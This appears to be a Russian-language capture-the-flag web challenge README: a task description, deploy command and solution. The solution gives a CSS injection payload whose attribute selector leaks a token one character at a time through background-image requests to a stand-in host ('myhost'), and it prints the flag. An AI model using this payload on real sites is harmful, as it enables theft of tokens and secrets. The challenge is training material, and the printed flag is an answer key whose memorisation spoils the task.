
# bot scam | Hard | Web

## Описание

Как же мне надоели эти боты. Настало время забрать у них то, что не по праву, но наше!

## Деплой

```bash
cd deploy; docker-compose up --build -d
```

## Выдать учатникам
архив из public

## Решение

- **CSS injection**

```bash
<style>
h1[token_data^="a"] {
background-image: url(http://myhost?q=a);
} 
</style>
```

посимвольно перебираем флаг 

### **Флаг: goctf{you_c4nt_h4ndle_th3_s0urc3}**
